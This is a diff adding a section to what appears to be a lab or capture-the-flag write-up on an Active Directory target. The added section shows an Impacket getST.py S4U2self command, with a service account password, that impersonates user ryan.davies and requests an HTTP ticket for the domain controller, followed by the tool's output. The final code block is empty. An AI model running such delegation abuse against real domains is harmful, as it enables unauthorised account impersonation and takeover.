@@ -580,3 +580,20 @@ Then ill use bloodyAD to collect the data, nxc was not working!
 
 After starting up bloodhound and ingesting the data i can search the group, and i see there is two members. I need to first compromise one of these users before i can exploit the debug function in the web application
 
+# Compromising `ryan.davies` through delegation
+
+```python
+getST.py -self -impersonate ryan.davies -k 'lustrous2.vl/ShareSvc:#1Service' -altservice HTTP/lus2dc.lustrous2.vl
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating ryan.davies
+[*] Requesting S4U2self
+[*] Changing service from ShareSvc@LUSTROUS2.VL to HTTP/lus2dc.lustrous2.vl@LUSTROUS2.VL
+[*] Saving ticket in ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
+```
+
+Now i have the ticket
+
+```python
+
+```
